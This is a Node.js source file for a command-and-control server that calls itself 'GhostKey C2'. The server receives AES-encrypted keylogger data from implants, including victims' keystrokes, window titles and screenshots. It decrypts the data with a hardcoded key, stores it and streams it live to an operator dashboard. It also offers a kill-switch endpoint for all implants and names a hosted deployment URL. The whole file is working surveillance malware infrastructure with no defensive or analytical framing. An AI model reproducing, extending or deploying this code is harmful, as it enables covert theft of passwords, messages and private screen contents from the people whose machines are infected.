const express = require('express');
const CryptoJS = require('crypto-js');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const AES_KEY = "x93mK!qWeR7zL9p&2vN8bT5cY4fU6jH0";

app.use(cors());
app.use(bodyParser.json({ limit: '30mb' })); // ↑ increased for big screenshots
app.use(bodyParser.urlencoded({ limit: '30mb', extended: true }));
app.use(express.static('public'));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

let clients = [];
let history = []; // ← THIS IS YOUR PERSISTENT HISTORY

app.get('/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Access-Control-Expose-Headers', 'Content-Length');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');
  res.flushHeaders();

  res.write('data: {"type":"connected"}\n\n');
  clients.push(res);

  // Send full history on connect
  history.forEach(entry => {
    res.write(`data: ${JSON.stringify(entry)}\n\n`);
  });

  req.on('close', () => {
    clients = clients.filter(c => c !== res);
  });
});

app.get('/history', (req, res) => res.json(history));

function broadcast(entry) {
  const data = JSON.stringify(entry);
  clients.forEach(c => {
    try { c.write(`data: ${data}\n\n`); } catch {}
  });
}

// FIXED DECRYPT
function decrypt(b64) {
  try {
    const data = CryptoJS.enc.Base64.parse(b64);
    const iv = data.clone(); iv.sigBytes = 16; iv.clamp();
    const ct = data.clone(); ct.words.splice(0,4); ct.sigBytes -= 16;
    const dec = CryptoJS.AES.decrypt({ciphertext: ct}, CryptoJS.enc.Utf8.parse(AES_KEY), {
      iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7
    });
    return JSON.parse(dec.toString(CryptoJS.enc.Utf8));
  } catch (e) { console.log("Decrypt error:", e.message); return null; }
}

app.post('/ghost', (req, res) => {
  const payload = decrypt(req.body.data);
  if (payload) {
    payload.id = Date.now() + Math.random(); // unique ID
    payload.timestamp = new Date().toISOString();
    history.push(payload);
    if (history.length > 1000) history.shift(); // limit
    console.log(`[+] ${payload.Client} | ${payload.Window} | ${payload.Keys?.length || 0} keys${payload.Screenshot?' + SS':''}`);
    broadcast(payload);
  }
  res.json({success: true});
});

// KILL SWITCH — LETS YOU NUKE ALL IMPLANTS
app.get('/killme', (req, res) => {
  const code = req.query.code;
  if (code === "CENTRALI_KILL_999") {  // ← must match your Go code
    broadcast({ kill: true });        // optional: tell dashboard
    res.send("KILL COMMAND SENT — ALL IMPLANTS DYING");
  } else {
    res.status(403).send("WRONG KILL CODE");
  }
});

// Heartbeat
setInterval(() => {
  clients.forEach(c => { try { c.write(': ping\n\n'); } catch {} });
}, 15000);

app.listen(PORT, () => console.log(`GhostKey C2 LIVE → https://fs-tracker-online-ghost.onrender.com`));